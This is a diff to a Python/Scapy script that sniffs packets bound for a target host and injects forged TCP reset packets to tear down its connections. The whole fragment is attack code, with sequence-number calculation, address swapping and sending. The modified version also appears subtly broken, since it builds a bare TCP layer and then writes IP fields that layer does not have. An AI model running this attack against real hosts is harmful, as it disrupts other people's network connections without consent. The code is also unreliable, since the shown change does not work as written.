@@ -10,20 +10,20 @@ def pkt_callback(packet):
         #print("seq: %d, ack: %d" % (packet[TCP].seq, packet[TCP].ack))
         #print("next seq: %d, next ack: %d" % (packet[TCP].ack, packet[TCP].seq + len(packet[TCP])-32))
         if (packet[IP].dst == target_ip):
-            resetPkt = packet
+            resetPkt = TCP()
             #set reset packet
             resetPkt[TCP].flags = 'R'
             #the seq number should be whatever was last acked
             #the ack number should be whatever the last seq was + len of data
-            seq = resetPkt[TCP].ack
-            ack = resetPkt[TCP].seq + len(packet[TCP])-32
-            dst = resetPkt[IP].dst
-            src = resetPkt[IP].src
+            seq = packet[TCP].ack
+            ack = packet[TCP].seq + len(packet[TCP])-32
+            dst = packet[IP].dst
+            src = packet[IP].src
             resetPkt[TCP].seq = seq
             resetPkt[TCP].ack = ack
             resetPkt[IP].src = dst
             resetPkt[IP].dst = src
-            sendp(resetPkt)
+            send(resetPkt)
 
 
 random.seed()
